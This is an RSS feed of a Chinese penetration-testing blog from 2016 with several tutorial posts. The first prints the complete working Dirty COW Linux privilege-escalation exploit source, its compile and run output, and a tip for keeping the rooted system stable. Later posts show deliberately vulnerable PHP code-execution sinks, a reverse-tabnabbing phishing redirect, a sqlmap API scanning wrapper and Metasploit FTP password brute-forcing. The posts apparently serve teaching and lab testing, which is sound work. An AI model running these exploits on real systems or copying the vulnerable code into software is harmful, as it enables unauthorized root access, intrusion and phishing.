<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on </title>
    <link>http://wyb0.com/topics/pentest/</link>
    <description>Recent content in Pentest on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sat, 22 Oct 2016 00:10:46 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/topics/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E/</guid>
      <description>

&lt;h3 id=&#34;0x00-测试环境:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x00 测试环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-创建文件:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x01 创建文件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;查看文件权限信息，可以看到属主为root，且只读，权限为0404&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-编译-执行poc:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x02 编译、执行poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;POC保存为a.c，编译为aaa&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-后续利用:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x03 后续利用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;更改用户gid为0即可

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow1.png&#34; alt=&#34;脏牛1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow2.png&#34; alt=&#34;脏牛2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;提权后执行下：echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附poc:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x04 附poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &amp;gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
&amp;gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&amp;gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&amp;quot;madvise %d\n\n&amp;quot;,c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
&amp;gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat
&amp;gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&amp;gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&amp;gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&amp;quot;/proc/self/mem&amp;quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&amp;quot;procselfmem %d\n\n&amp;quot;, c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&amp;lt;3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&amp;gt; Create a private copy-on-write mapping.  Updates to the
&amp;gt; mapping are not visible to other processes mapping the same
&amp;gt; file, and are not carried through to the underlying file.  It
&amp;gt; is unspecified whether changes made to the file after the
&amp;gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&amp;quot;mmap %x\n\n&amp;quot;,map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>代码执行漏洞2</title>
      <link>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</guid>
      <description>

&lt;p&gt;接着上一篇：&lt;a href=&#34;http://reber-9.com/post/代码执行漏洞/&#34;&gt;http://reber-9.com/post/代码执行漏洞/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x00-函数create-function:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x00 函数create_function()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;string create_function ( string $args , string $code )
其中$args是函数的参数，$code是函数的内容
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-示例:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;示例a.php代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $test = @$_GET[&#39;test&#39;];
    $newfun = create_function(&#39;$a,$b&#39;, $test);
    $newfun(&#39;1111&#39;,&#39;2222&#39;);
?&amp;gt;
上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function1.png&#34; alt=&#34;示例1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function2.png&#34; alt=&#34;示例2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function3.png&#34; alt=&#34;示例3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-函数assert:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x02 函数assert()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个函数和eval()的作用差不多&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_assert.png&#34; alt=&#34;函数assert()&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>关于_blank</title>
      <link>http://wyb0.com/posts/%E5%85%B3%E4%BA%8E_blank/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%85%B3%E4%BA%8E_blank/</guid>
      <description>

&lt;h3 id=&#34;0x00-blank:c6afb95d94dc84d45d958ba7b99d9312&#34;&gt;0x00 _blank&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;_blank是html中的标签属性，如&lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;&lt;/code&gt;, 但若点击HELLO打开的网页1.php中有如下代码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
if(window.opener){
  window.opener.location  = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;则原网页将转跳到&lt;a href=&#34;http://xss.reber-9.com/fish.html&#34;&gt;http://xss.reber-9.com/fish.html&lt;/a&gt; ，这就会造成钓鱼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单模板:c6afb95d94dc84d45d958ba7b99d9312&#34;&gt;0x01 简单模板&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;a.html内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://xss.reber-9.com/1.php&lt;/code&gt;中1.php内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
    &amp;lt;script&amp;gt;
        if(window.opener){
            window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;1.php同级下有个钓鱼模板fish.html，内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;点击a.html中的HELLO则会出现下面的情况，也就导致了钓鱼：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/blank.gif&#34; alt=&#34;blank钓鱼&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>http://wyb0.com/posts/SqlmapApi%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%81%E8%A3%85/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SqlmapApi%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%81%E8%A3%85/</guid>
      <description>

&lt;h2 id=&#34;代码如下:70bf25f9fe7a9487dff7f73d72c8f2fd&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import requests
import json
from time import sleep

class Sqli(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;):
        threading.Thread.__init__(self)
        self.server = server[0:-1] if server[-1]==&#39;/&#39; else server
        self.target = target
        self.data = data
        self.referer = referer
        self.cookie = cookie
        self.taskid = &#39;&#39;
        self.data

    def new_task(self):
        url = &amp;quot;{}/task/new&amp;quot;.format(self.server)
        self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;]
        if len(self.taskid)&amp;gt;0:
            print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.taskid
            return True
        return False

    def set_option(self):
        headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
        option = {&amp;quot;options&amp;quot;: {
                    &amp;quot;smart&amp;quot;: True,
                    }
                 }
        url = &amp;quot;{}/option/{}/set&amp;quot;.format(self.server,self.taskid)
        resp = requests.post(url, data=json.dumps(option), headers=headers)
        return json.loads(resp.text)[&#39;success&#39;]

    def start_scan(self):
        headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
        payload = {
            &#39;url&#39;: self.target,
            &#39;data&#39;: self.data,
            &#39;cookie&#39;: self.cookie,
            &#39;referer&#39;: self.referer
        }
        url = &amp;quot;{}/scan/{}/start&amp;quot;.format(self.server,self.taskid)
        t = json.loads(requests.post(url,data=json.dumps(payload),headers=headers).text)
        if len(str(t[&#39;engineid&#39;])) &amp;gt; 0 and t[&#39;success&#39;]:
            print &amp;quot;[%s] Start scan&amp;quot; % self.taskid
            return True
        return False

    def get_status(self):
        url = &amp;quot;{}/scan/{}/status&amp;quot;.format(self.server,self.taskid)
        status = json.loads(requests.get(url).text)[&#39;status&#39;]
        if status == &#39;running&#39;:
            return &#39;running&#39;
        elif status == &#39;terminated&#39;:
            return &#39;terminated&#39;
        else:
            return &#39;error&#39;

    def get_data(self):
        url = &amp;quot;{}/scan/{}/data&amp;quot;.format(self.server,self.taskid)
        data = json.loads(requests.get(url).text)[&#39;data&#39;]
        if len(data) == 0:
            print &#39;[] not injection:\t&#39; + self.target
        else:
            print &#39;=======&amp;gt; injection:\t&#39; + self.target
            self.data = data

    def delete_task(self):
        url = &amp;quot;{}/task/{}/delete&amp;quot;.format(self.server,self.taskid)
        if json.loads(requests.get(url).text)[&#39;success&#39;]:
            print &amp;quot;[%s] Delete task&amp;quot; % self.taskid
            return True
        return False

    def write_to_file(self,msg):
        with open(&#39;result.txt&#39;,&#39;a+&#39;) as f:
            f.write(json.dumps(msg)+&#39;\n\n&#39;)

    def run(self):
        try:
            if not self.new_task():
                return False
            self.set_option()
            if not self.start_scan():
                return False
            while True:
                if self.get_status() == &#39;running&#39;:
                    sleep(10)
                elif self.get_status() == &#39;terminated&#39;:
                    break
                else:
                    break
            self.get_data()
            self.write_to_file(self.data)
            self.delete_task()
        except Exception, e:
            print e

if __name__ == &#39;__main__&#39;:
    server = &#39;http://127.0.0.1:8775&#39;
    target = &#39;http://192.168.188.134/sqli/Less-1/?id=1&#39;
    sqli = Sqli(server, target)
    sqli.start()
    sqli.join()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit的简单使用</title>
      <link>http://wyb0.com/posts/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
      <description>

&lt;h3 id=&#34;0x00-启动:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x00 启动&lt;/h3&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_start.png&#34; alt=&#34;启动msf&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-metasploit的工作平台:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x01 Metasploit的工作平台&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;在msf里的工作平台可以保存历史的一些操作信息

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_workspace_h.png&#34; alt=&#34;msf工作平台的帮助信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_workspace.png&#34; alt=&#34;创建新的工作平台&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-使用db-nmap扫描主机:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x02 使用db_nmap扫描主机&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_nmap_lanou3g_ip.png&#34; alt=&#34;扫描lanou3g的ip信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&#34;扫描后的结果会保留在工作平台中-可以用hosts和services进行查看:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_hosts.png&#34; alt=&#34;查看主机列表&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_services.png&#34; alt=&#34;查看服务&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-使用msf的模块进行弱口令爆破:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x03 使用msf的模块进行弱口令爆破&lt;/h3&gt;

&lt;blockquote&gt;
&lt;h4 id=&#34;注-这里针对ftp服务进行弱口令测试:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;注：这里针对ftp服务进行弱口令测试&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_services_p_21.png&#34; alt=&#34;查看都有那个主机开启了21端口&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_search_module.png&#34; alt=&#34;查找用于ftp爆破的模块&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_use_module_and_set.png&#34; alt=&#34;使用模块并设置参数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_use_show_options.png&#34; alt=&#34;查看设置的参数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_start_attack_ftp.png&#34; alt=&#34;开始攻击&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;使用vulns可以查看结果-msf-auxiliary-ftp-login-vulns:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns&lt;/h4&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>http://wyb0.com/posts/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85Metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85Metasploit/</guid>
      <description>

&lt;h3 id=&#34;0x00-安装metasploit:5ef2fdcf3f10108bc00e8ee0aa9fa263&#34;&gt;0x00 安装Metasploit&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;下载msfinstall脚本&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;修改文件权限&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ chmod 755 msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装(时间较久)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-连接数据库:5ef2fdcf3f10108bc00e8ee0aa9fa263&#34;&gt;0x01 连接数据库&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先启动postgresql数据库&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ /etc/init.d/postgresql start #service postgresql start也可以
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;初始化MSF数据库(关键步骤)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ msfdb init
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;运行msfconsole&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在msf中查看数据库连接状态&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; db_status
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>http://wyb0.com/posts/BurpSuite%E6%8A%93%E6%89%8B%E6%9C%BA%E5%8C%85/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/BurpSuite%E6%8A%93%E6%89%8B%E6%9C%BA%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-环境设置:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x00 环境设置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Windows Phone手机和电脑处于同一无线环境下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_pc_ip.png&#34; alt=&#34;PC机的ip&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_ip_set.png&#34; alt=&#34;IP设置&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-burpsuite设置:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x01 BurpSuite设置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_set_phone_proxy1.png&#34; alt=&#34;设置burpsuite抓8888端口的包1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_set_phone_proxy2.png&#34; alt=&#34;设置burpsuite抓8888端口的包2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-抓http包:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x02 抓HTTP包&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_phone_visit_internet.png&#34; alt=&#34;手机访问网络&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_phone_packet.png&#34; alt=&#34;burpsuite抓手机包&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-抓https包:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x03 抓HTTPS包&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;挂burpsuite的代理下载证书

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_down_ca1.png&#34; alt=&#34;下载证书1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_down_ca2.png&#34; alt=&#34;下载证书2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书&lt;br /&gt;
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装

&lt;div class=&#34;pure-u-1&#34;&gt;
